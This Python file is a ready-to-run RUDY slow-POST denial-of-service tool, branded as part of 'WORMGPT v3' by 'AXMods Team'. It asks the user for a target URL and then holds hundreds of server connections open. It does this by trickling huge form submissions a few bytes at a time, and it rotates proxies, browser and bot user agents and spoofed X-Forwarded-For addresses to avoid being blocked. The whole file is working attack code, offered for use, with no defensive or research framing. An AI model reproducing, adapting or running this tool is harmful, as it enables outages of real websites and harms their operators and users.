#!/usr/bin/env python3
"""
/AXMODS/DDOS/attack_method/rudy.py
R-U-DEAD-YET (RUDY) ATTACK MODULE - WORMGPT v3
Advanced Slow POST with Form Field Manipulation
"""

import socket
import ssl
import random
import threading
import time
import sys
import os
import string
from urllib.parse import urlparse, quote

class RUDYAttack:
    def __init__(self, target, port=80, connections=150, duration=0, proxy=False):
        """
        Initialize R-U-Dead-Yet Attack
        
        Args:
            target: Target URL
            port: Target port
            connections: Number of concurrent connections
            duration: Attack duration in seconds (0=infinite)
            proxy: Use proxy rotation
        """
        self.target = target
        self.parsed_url = urlparse(target)
        self.host = self.parsed_url.netloc.split(':')[0]
        self.port = port
        self.connections = connections
        self.duration = duration
        self.use_proxy = proxy
        
        self.is_attacking = True
        self.active_connections = 0
        self.connection_pool = []
        self.start_time = time.time()
        
        # Advanced user agents including mobile and bots
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Bingbot/2.0 (+http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'
        ]
        
        # Complex form field names for realistic POST data
        self.form_fields = {
            'user': ['username', 'user_login', 'user_name', 'user_id', 'login'],
            'personal': ['first_name', 'last_name', 'full_name', 'display_name', 'nickname'],
            'contact': ['email', 'email_address', 'phone', 'mobile', 'telephone', 'address', 'city', 'zip_code', 'country'],
            'auth': ['password', 'passwd', 'confirm_password', 'old_password', 'new_password'],
            'content': ['message', 'comment', 'description', 'content', 'body', 'text', 'post_content'],
            'metadata': ['title', 'subject', 'topic', 'category', 'tags', 'keywords'],
            'file': ['attachment', 'file', 'upload', 'image', 'document'],
            'system': ['csrf_token', 'session_id', 'auth_token', 'captcha', 'recaptcha_response']
        }
        
        # Common form endpoints
        self.form_endpoints = [
            '/wp-admin/admin-ajax.php',
            '/contact-form', '/contact', '/contact-us',
            '/submit', '/post', '/comment', '/reply',
            '/api/v1/submit', '/api/v1/contact',
            '/user/register', '/user/login',
            '/checkout', '/order', '/cart/submit',
            '/support/ticket', '/feedback',
            '/survey/submit', '/poll/vote',
            '/newsletter/subscribe',
            '/upload', '/file-upload'
        ]
        
        # Proxies
        self.proxies = []
        if proxy:
            self.load_proxies()
        
        # SSL context
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
        # Lock for thread safety
        self.lock = threading.Lock()
        
        # Attack statistics
        self.stats = {
            'connections_created': 0,
            'requests_sent': 0,
            'data_sent_bytes': 0,
            'last_activity': time.time()
        }
    
    def load_proxies(self):
        """Load proxies from file"""
        try:
            if os.path.exists('proxies.txt'):
                with open('proxies.txt', 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                print(f"[+] Loaded {len(self.proxies)} proxies")
        except:
            pass
    
    def create_socket(self, connection_id):
        """Create and connect a socket with advanced options"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Advanced socket options
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.settimeout(15)
            
            # Use proxy if available
            if self.use_proxy and self.proxies:
                proxy = random.choice(self.proxies)
                proxy_host, proxy_port = proxy.split(':')
                sock.connect((proxy_host, int(proxy_port)))
                
                # HTTPS proxy CONNECT method
                if self.parsed_url.scheme == 'https':
                    connect_request = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\n"
                    connect_request += f"Host: {self.host}:{self.port}\r\n"
                    connect_request += f"Proxy-Connection: keep-alive\r\n"
                    connect_request += f"User-Agent: {random.choice(self.user_agents)}\r\n\r\n"
                    
                    sock.send(connect_request.encode())
                    response = sock.recv(4096)
                    
                    if b'200' not in response and b'Connection established' not in response:
                        raise Exception(f"Proxy CONNECT failed: {response[:100]}")
            else:
                sock.connect((self.host, self.port))
            
            # Wrap with SSL for HTTPS
            if self.parsed_url.scheme == 'https':
                if self.use_proxy and self.proxies:
                    # Already connected via proxy
                    sock = self.ssl_context.wrap_socket(sock, server_hostname=self.host)
                else:
                    sock = self.ssl_context.wrap_socket(sock, server_hostname=self.host)
            
            # Add to connection pool
            with self.lock:
                self.connection_pool.append(sock)
                self.active_connections += 1
                self.stats['connections_created'] += 1
            
            return sock
            
        except Exception as e:
            return None
    
    def generate_form_data_structure(self, total_size=1000000):
        """Generate realistic form data structure"""
        form_parts = []
        remaining_size = total_size
        
        # Generate multiple form fields
        field_count = random.randint(8, 15)
        
        for i in range(field_count):
            if remaining_size <= 100:
                break
            
            # Select field category
            category = random.choice(list(self.form_fields.keys()))
            field_name = random.choice(self.form_fields[category])
            
            # Generate field value
            if category in ['content', 'message']:
                # Large text content
                value_size = min(random.randint(5000, 50000), remaining_size - len(field_name) - 1)
                value = ''.join(random.choices(string.ascii_letters + string.digits + ' ', k=value_size))
            elif category == 'file':
                # Simulate file data (base64-like)
                value_size = min(random.randint(10000, 100000), remaining_size - len(field_name) - 1)
                value = quote(''.join(random.choices(string.ascii_letters + string.digits + '/+=', k=value_size)))
            else:
                # Regular field
                value_size = min(random.randint(10, 100), remaining_size - len(field_name) - 1)
                value = ''.join(random.choices(string.ascii_letters + string.digits, k=value_size))
            
            # URL encode the value
            encoded_value = quote(value)
            form_parts.append(f"{field_name}={encoded_value}")
            remaining_size -= len(field_name) + len(encoded_value) + 1
        
        return '&'.join(form_parts)[:total_size]
    
    def send_slow_post_request(self, sock, connection_id):
        """Send a slow POST request with advanced techniques"""
        try:
            # Select random endpoint
            endpoint = random.choice(self.form_endpoints)
            
            # Generate form data (500KB - 2MB)
            content_length = random.randint(500000, 2000000)
            form_data = self.generate_form_data_structure(content_length)
            
            # Advanced headers with variations
            headers = [
                f"POST {endpoint} HTTP/1.1",
                f"Host: {self.host}",
                f"User-Agent: {random.choice(self.user_agents)}",
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                f"Accept-Language: en-US,en;q=0.5",
                f"Accept-Encoding: gzip, deflate, br",
                f"Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
                f"Content-Length: {content_length}",
                f"Connection: keep-alive",
                f"Cache-Control: no-cache",
                f"Pragma: no-cache",
                f"Origin: {self.parsed_url.scheme}://{self.host}",
                f"Referer: {self.parsed_url.scheme}://{self.host}/",
                f"X-Requested-With: XMLHttpRequest" if random.random() > 0.5 else "",
                f"X-CSRF-Token: {random.randint(1000000, 9999999)}" if random.random() > 0.7 else "",
                f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                f"\r\n"
            ]
            
            # Filter out empty headers
            headers = [h for h in headers if h]
            header_string = '\r\n'.join(headers)
            
            # Send headers
            sock.send(header_string.encode())
            
            # Send data EXTREMELY SLOWLY with variations
            bytes_sent = 0
            total_chunks = random.randint(100, 500)  # Number of chunks to send
            
            for chunk_num in range(total_chunks):
                if not self.is_attacking:
                    break
                
                # Check duration
                if self.duration > 0 and (time.time() - self.start_time) > self.duration:
                    break
                
                # Calculate chunk size (very small)
                remaining_data = len(form_data) - bytes_sent
                if remaining_data <= 0:
                    break
                
                # Variable chunk sizes (1-100 bytes)
                chunk_size = random.randint(1, min(100, remaining_data))
                chunk = form_data[bytes_sent:bytes_sent + chunk_size]
                
                # Send chunk
                try:
                    sock.send(chunk.encode())
                    bytes_sent += len(chunk)
                    
                    with self.lock:
                        self.stats['requests_sent'] += 1
                        self.stats['data_sent_bytes'] += len(chunk)
                        self.stats['last_activity'] = time.time()
                    
                except Exception as e:
                    break
                
                # Random delay between chunks (5-60 seconds)
                delay = random.uniform(5, 60)
                
                # Occasionally send keep-alive headers during delay
                if random.random() > 0.8:
                    time.sleep(delay / 2)
                    
                    # Send a keep-alive header
                    keep_alive_header = f"X-{random.choice(['Custom', 'Additional', 'Extra'])}-Header: {random.randint(1000, 9999)}\r\n"
                    try:
                        sock.send(keep_alive_header.encode())
                    except:
                        break
                    
                    time.sleep(delay / 2)
                else:
                    time.sleep(delay)
            
            return bytes_sent
            
        except Exception as e:
            return 0
    
    def connection_handler(self, connection_id):
        """Handle a single RUDY connection with reconnection logic"""
        sock = None
        reconnect_attempts = 0
        max_reconnect_attempts = 5
        
        while self.is_attacking and reconnect_attempts < max_reconnect_attempts:
            # Check duration
            if self.duration > 0 and (time.time() - self.start_time) > self.duration:
                break
            
            # Create or recreate socket
            sock = self.create_socket(connection_id)
            if sock is None:
                reconnect_attempts += 1
                time.sleep(10)
                continue
            
            # Reset reconnect attempts on successful connection
            reconnect_attempts = 0
            
            try:
                # Set longer timeout for slow sending
                sock.settimeout(120)
                
                # Perform slow POST attack
                bytes_sent = self.send_slow_post_request(sock, connection_id)
                
                if bytes_sent > 0:
                    print(f"[+] Connection {connection_id}: Sent {bytes_sent} bytes")
                
                # Keep connection alive for a while after sending
                keep_alive_time = random.randint(30, 180)
                end_time = time.time() + keep_alive_time
                
                while time.time() < end_time and self.is_attacking:
                    time.sleep(10)
                    
                    # Send occasional keep-alive
                    if random.random() > 0.7:
                        try:
                            sock.send(f"X-Keep-Alive: {random.randint(1, 9999)}\r\n".encode())
                        except:
                            break
            
            except Exception as e:
                pass
            
            finally:
                # Close socket and cleanup
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
                    
                    with self.lock:
                        if sock in self.connection_pool:
                            self.connection_pool.remove(sock)
                        self.active_connections -= 1
                
                sock = None
                
                # Wait before reconnecting
                if self.is_attacking:
                    time.sleep(random.randint(5, 15))
    
    def monitor_and_report(self):
        """Monitor attack progress and report statistics"""
        while self.is_attacking:
            elapsed = time.time() - self.start_time
            
            if self.duration > 0 and elapsed >= self.duration:
                break
            
            with self.lock:
                active = self.active_connections
                stats = self.stats.copy()
            
            # Calculate metrics
            if elapsed > 0:
                bytes_per_sec = stats['data_sent_bytes'] / elapsed
                conn_per_sec = stats['connections_created'] / elapsed
            else:
                bytes_per_sec = 0
                conn_per_sec = 0
            
            idle_time = time.time() - stats['last_activity']
            
            # Display status
            sys.stdout.write(f"\r[+] Active: {active}/{self.connections} | "
                           f"Connections: {stats['connections_created']} | "
                           f"Data: {stats['data_sent_bytes']//1024}KB | "
                           f"Speed: {bytes_per_sec:.1f}B/s | "
                           f"Idle: {idle_time:.0f}s")
            sys.stdout.flush()
            
            time.sleep(1)
    
    def start(self):
        """Start RUDY attack"""
        print(f"\n╔{'═'*60}╗")
        print(f"║{'R-U-DEAD-YET (RUDY) ATTACK - WORMGPT v3'.center(60)}║")
        print(f"╚{'═'*60}╝")
        print(f"[+] Target: {self.target}")
        print(f"[+] Host: {self.host}:{self.port}")
        print(f"[+] Connections: {self.connections}")
        print(f("[+] Duration: {self.duration if self.duration > 0 else 'Infinite'} seconds"))
        print(f"[+] Proxy: {'Enabled' if self.use_proxy and self.proxies else 'Disabled'}")
        print(f("[+] Strategy: Advanced Slow POST with form field exhaustion"))
        print(f"[+] Press Ctrl+C to stop\n")
        
        # Start monitoring thread
        monitor_thread = threading.Thread(target=self.monitor_and_report)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Start connection threads
        threads = []
        
        # Initial batch
        initial_batch = min(self.connections, 50)
        for i in range(initial_batch):
            if not self.is_attacking:
                break
            
            thread = threading.Thread(target=self.connection_handler, args=(i,))
            thread.daemon = True
            threads.append(thread)
            thread.start()
            time.sleep(0.5)
        
        # Gradual ramp-up
        if self.connections > 50:
            def ramp_up_connections():
                time.sleep(20)
                
                remaining = self.connections - 50
                batch_size = 20
                
                for i in range(0, remaining, batch_size):
                    if not self.is_attacking:
                        break
                    
                    current_batch = min(batch_size, remaining - i)
                    for j in range(current_batch):
                        if not self.is_attacking:
                            break
                        
                        conn_id = 50 + i + j
                        thread = threading.Thread(target=self.connection_handler, args=(conn_id,))
                        thread.daemon = True
                        threads.append(thread)
                        thread.start()
                        time.sleep(1)
                    
                    time.sleep(15)
            
            ramp_thread = threading.Thread(target=ramp_up_connections)
            ramp_thread.daemon = True
            ramp_thread.start()
        
        # Main loop
        try:
            while self.is_attacking:
                elapsed = time.time() - self.start_time
                
                if self.duration > 0 and elapsed >= self.duration:
                    break
                
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            print(f"\n\n[!] Stopping attack...")
        
        # Cleanup
        self.is_attacking = False
        
        # Close all connections
        print(f"[~] Closing all connections...")
        with self.lock:
            for sock in self.connection_pool:
                try:
                    sock.close()
                except:
                    pass
            self.connection_pool.clear()
        
        time.sleep(3)
        
        # Final statistics
        elapsed = time.time() - self.start_time
        
        print(f"\n{'═'*65}")
        print(f"ATTACK COMPLETED")
        print(f"{'═'*65}")
        print(f"Duration: {elapsed:.1f} seconds")
        print(f"Max concurrent connections: {self.connections}")
        print(f"Total connections created: {self.stats['connections_created']}")
        print(f"Total data sent: {self.stats['data_sent_bytes']//1024} KB")
        print(f"Average data rate: {self.stats['data_sent_bytes']/elapsed:.1f} B/s" if elapsed > 0 else "N/A")
        print(f"{'═'*65}")
        
        return {
            'duration': elapsed,
            'max_connections': self.connections,
            'total_connections': self.stats['connections_created'],
            'total_data_bytes': self.stats['data_sent_bytes'],
            'attack_type': 'R-U-Dead-Yet (RUDY)'
        }

def main():
    """Standalone execution"""
    print("""
╔══════════════════════════════════════════════════╗
║         R-U-DEAD-YET (RUDY) ATTACK MODULE       ║
║         WORMGPT v3 - AXMods Team                ║
╚══════════════════════════════════════════════════╝
    """)
    
    # Get target from user
    target = input("[?] Target URL (http:// or https://): ").strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Parse URL
    parsed = urlparse(target)
    host = parsed.netloc.split(':')[0]
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    
    # Get parameters
    try:
        connections = int(input("[?] Number of connections (50-500, default 150): ") or "150")
        duration = int(input("[?] Duration in seconds (0=infinite): ") or "0")
        use_proxy = input("[?] Use proxies? (y/N): ").lower() == 'y'
        
        # Advanced options
        print(f"\n[+] Advanced Options:")
        print(f"[+] 1. Use default settings")
        print(f("[+] 2. Configure custom parameters"))
        
        option = input("[?] Select option (1-2, default 1): ") or "1"
        
        if option == "2":
            print(f("\n[+] Custom Configuration:"))
            # Additional configuration options can be added here
            
    except Exception as e:
        print(f"[!] Invalid input: {e}, using defaults")
        connections = 150
        duration = 0
        use_proxy = False
    
    # Start attack
    attack = RUDYAttack(target, port, connections, duration, use_proxy)
    attack.start()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n[!] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)
